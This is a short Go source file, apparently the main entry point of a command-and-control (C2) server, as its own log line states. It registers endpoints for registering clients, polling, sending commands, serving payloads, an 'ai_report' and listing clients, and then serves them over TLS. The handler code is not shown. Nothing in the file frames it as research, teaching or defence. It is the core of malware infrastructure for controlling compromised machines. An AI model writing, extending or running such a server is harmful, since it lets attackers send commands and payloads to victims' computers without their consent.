package main

import (
	"crypto/tls"
	"log"
	"net/http"
)

func main() {
	InitDB()
	loadConfig()
	http.HandleFunc("/api/register", registerHandler)
	http.HandleFunc("/api/poll", pollHandler)
	http.HandleFunc("/api/sendcmd", sendCmdHandler)
	http.HandleFunc("/api/payload", payloadHandler)
	http.HandleFunc("/api/ai_report", aiReportHandler)
	http.HandleFunc("/api/clients", clientsHandler)

	cert, _ := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
	tlsCfg := &tls.Config{Certificates: []tls.Certificate{cert}}
	srv := &http.Server{Addr: ":" + cfg.Port, TLSConfig: tlsCfg}
	log.Printf("C2 listening on :%s", cfg.Port)
	log.Fatal(srv.ListenAndServeTLS("", ""))
}
